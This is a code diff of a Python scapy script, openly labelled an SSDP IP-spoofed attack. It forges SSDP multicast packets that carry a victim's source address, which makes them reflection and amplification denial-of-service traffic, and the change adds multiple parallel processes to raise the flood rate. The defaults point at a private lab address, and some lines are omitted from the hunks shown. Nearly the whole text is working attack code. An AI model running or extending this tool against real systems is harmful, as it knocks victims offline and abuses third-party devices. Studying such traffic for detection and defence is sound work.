@@ -1,19 +1,24 @@
 from scapy.all import *
+from multiprocessing import Process
+import os
 import argparse
 import sys
 
 parser = argparse.ArgumentParser(description="SSDP IP-Spoofed based attack")
 parser.add_argument('--victim', '-v', default="172.16.0.2",
-                     help="Victim of the attack. Default is 172.16.0.2")
+                    help="Victim of the attack. Default is 172.16.0.2")
 parser.add_argument('--duration', '-d', default=80, type=int,
                     help="Duration of the attack, default is 80 seconds")
 parser.add_argument('--interval', '-i', default=50, type=int,
                     help="Interval between two seperate round of attack, default is 50 milleseconds")
+parser.add_argument('--process', '-p', default=3, type=int,
+                    help="Number of processes to conduct the attach, default is 3")
 
 namespace = parser.parse_args()
 target_ip = namespace.victim
 duration = namespace.duration
 interval = namespace.interval/1000
+p_number = namespace.process
 spoofed_packets = list()
 
 msg = \
@@ -28,6 +33,22 @@ spoofed_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=target_ip, dst="239.255
 spoofed_packets.append(packet)
 
 END = time.time() + duration
-while time.time() < END:
-     sendp(spoofed_packet)
+
+def attack():
+     while time.time() < END:
+         sendp(spoofed_packet)
      time.sleep(interval)
+
+def main():
+     processes = list()
+     for i in range(0, p_number):
+          processes.append(Process(target=attack))
+     
+     for p in processes:
+          p.start()
+     
+     for p in processes:
+          p.join()
+
+if __name__ == '__main__':
+     main()
